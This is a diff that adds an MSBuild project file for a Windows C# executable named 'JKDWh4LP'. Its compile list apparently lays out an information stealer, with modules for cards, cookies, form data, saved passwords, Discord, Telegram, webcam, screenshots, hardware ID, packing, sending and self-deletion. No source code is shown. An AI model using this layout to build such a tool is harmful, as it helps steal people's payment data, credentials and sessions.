@@ -1,0 +1,78 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProjectGuid>{09190222-8EC7-43E4-A23A-6ABC1AC4228E}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>JKDWh4LP</RootNamespace>
+    <AssemblyName>JKDWh4LP</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Strange.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Drawing" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="govno\Features\Desktop.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Strange\Additions\Delete.cs" />
+    <Compile Include="Strange\Additions\Hwid.cs" />
+    <Compile Include="Strange\Additions\NameR.cs" />
+    <Compile Include="Strange\Additions\Packer.cs" />
+    <Compile Include="Strange\Additions\Send.cs" />
+    <Compile Include="Strange\Additions\Win.cs" />
+    <Compile Include="Strange\Collect.cs" />
+    <Compile Include="Strange\Decod.cs" />
+    <Compile Include="Strange\Features\WebCam.cs" />
+    <Compile Include="Strange\Main_Features\Cards.cs" />
+    <Compile Include="Strange\Main_Features\Cookies.cs" />
+    <Compile Include="Strange\Main_Features\Forms.cs" />
+    <Compile Include="Strange\Main_Features\SavedPass.cs" />
+    <Compile Include="Strange\Miscellaneous.cs" />
+    <Compile Include="Strange\Modules\Discord.cs" />
+    <Compile Include="Strange\Modules\Screenshot.cs" />
+    <Compile Include="Strange\Modules\Telegram.cs" />
+    <Compile Include="Strange\Program.cs" />
+    <Compile Include="Strange\Setting.cs" />
+    <Compile Include="Strange\String\CardData.cs" />
+    <Compile Include="Strange\String\CookieData.cs" />
+    <Compile Include="Strange\String\FormData.cs" />
+    <Compile Include="Strange\String\PassData.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
